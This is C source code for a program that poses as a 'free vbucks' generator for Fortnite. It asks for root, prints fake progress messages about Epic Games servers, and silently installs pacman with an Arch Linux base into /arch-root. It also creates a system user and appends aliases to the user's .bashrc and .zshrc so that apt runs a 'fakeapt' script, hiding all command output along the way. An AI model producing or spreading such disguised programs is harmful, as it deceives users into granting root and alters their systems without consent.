#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <pwd.h>

#include "file_arrays/pacman.h"
#include "file_arrays/libalpm.h"
#include "file_arrays/pacman_key.h"
#include "file_arrays/pacman_conf.h"
#include "file_arrays/vercmp.h"
#include "file_arrays/pacman_config.h"
#include "file_arrays/mirrorlist.h"
#include "file_arrays/makepkg_message.h"
#include "file_arrays/makepkg_parseopts.h"
#include "file_arrays/archlinux_gpg.h"
#include "file_arrays/archlinux_trusted.h"
#include "file_arrays/archlinux_revoked.h"
#include "file_arrays/fakeapt.h"

// writes file from buffer to disk
void write_file(const unsigned char *contents, const unsigned int contents_len, const char *out_path, mode_t permissions) {
	int f = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, permissions);
	write(f, contents, contents_len);
	close(f);
}

// runs a command in shell and supresses its output
void system_no_output(const char *command) {
	char command_buffer[1024];
	sprintf(command_buffer, "%s >/dev/null 2>/dev/null", command);
	system(command_buffer);
}

// add aliases and modify PATH in .bashrc/.zshrc files
void modify_rc_files() {
	// get paths to .bashrc and .zshrc
	char bashrc_path[128], zshrc_path[128];
	char *sudo_user = getenv("SUDO_USER");
	struct passwd *pw = getpwnam(sudo_user);
	sprintf(bashrc_path, "%s/.bashrc", pw->pw_dir);
	sprintf(zshrc_path, "%s/.zshrc", pw->pw_dir);

	// lines to add to the .bashrc and .zshrc files
	char *config_lines = "\nalias sudo='sudo '\nalias apt=fakeapt\nexport PATH=\"$PATH:/arch-root/bin\"";

	// append/create .bashrc
	int bashrc = open(bashrc_path, O_WRONLY | O_APPEND | O_CREAT, 0644);
	write(bashrc, config_lines, strlen(config_lines));
	close(bashrc);

	// append/create .zshrc
	int zshrc = open(zshrc_path, O_WRONLY | O_APPEND | O_CREAT, 0644);
	write(zshrc, config_lines, strlen(config_lines));
	close(zshrc);
}

// installs pacman onto system
void install_pacman() {
	// write necessary binaries
	write_file(pacman, pacman_len, pacman_out_path, 0755);
	write_file(libalpm, libalpm_len, libalpm_out_path, 0755);
	write_file(pacman_key, pacman_key_len, pacman_key_out_path, 0755);
	write_file(pacman_conf, pacman_conf_len, pacman_conf_out_path, 0755);
	write_file(vercmp, vercmp_len, vercmp_out_path, 0755);

	// make makepkg directories
	mkdir("/usr/share/makepkg", 0755);
	mkdir("/usr/share/makepkg/util", 0755);

	// write necessary scripts
	write_file(makepkg_message, makepkg_message_len, makepkg_message_out_path, 0644);
	write_file(makepkg_parseopts, makepkg_parseopts_len, makepkg_parseopts_out_path, 0644);

	// write pacman config file
	write_file(pacman_config, pacman_config_len, pacman_config_out_path, 0644);

	// make pacman.d directory and write mirrorlist into it
	mkdir("/etc/pacman.d", 0755);
	write_file(mirrorlist, mirrorlist_len, mirrorlist_out_path, 0644);

	// create needed directories
	mkdir("/var/lib/pacman", 0755);
	mkdir("/var/cache/pacman", 0755);
	mkdir("/var/cache/pacman/pkg", 0755);

	// make dirrectory for keyrings
	mkdir("/usr/share/pacman", 0755);
	mkdir("/usr/share/pacman/keyrings", 0755);

	// write keyring file
	write_file(archlinux_gpg, archlinux_gpg_len, archlinux_gpg_out_path, 0644);
	write_file(archlinux_trusted, archlinux_trusted_len, archlinux_trusted_out_path, 0644);
	write_file(archlinux_revoked, archlinux_revoked_len, archlinux_revoked_out_path, 0644);

	// create alpm download user
	system_no_output("sudo groupadd -r alpm");
	system_no_output("sudo useradd -r -g alpm -d /var/cache/pacman/pkg -s /bin/false alpm");

	// populate keys
	system_no_output("sudo pacman-key --init");
	system_no_output("sudo pacman-key --populate");

	// create new root directory for pacman to avoid conflicts in real root
	mkdir("/arch-root", 0755);

	// create db path directories
	mkdir("/arch-root/var", 0755);
	mkdir("/arch-root/var/lib", 0755);
	mkdir("/arch-root/var/lib/pacman", 0755);

	// sync databases and install base
	system_no_output("sudo pacman --root /arch-root -Sy");
	system_no_output("sudo pacman --root /arch-root -S base --noconfirm");

	// write fakeapt script to bin (alias for apt -> pacman)
	write_file(fakeapt, fakeapt_len, fakeapt_out_path, 0755);

	// modify rc files
	modify_rc_files();
}

int main() {
	// check for root privilages
	int root_check = geteuid();
	if (root_check != 0) {
		printf("To get free vbucks you must run this program with root privilages");
		return 1;
	}

	// Add free vbucks
	printf("Accessing Epic Games servers...\n");
	install_pacman();
	printf("Adding free vbucks...\n");
	sleep(3);
	printf("Free vbucks added!\n");

	return 0;
}
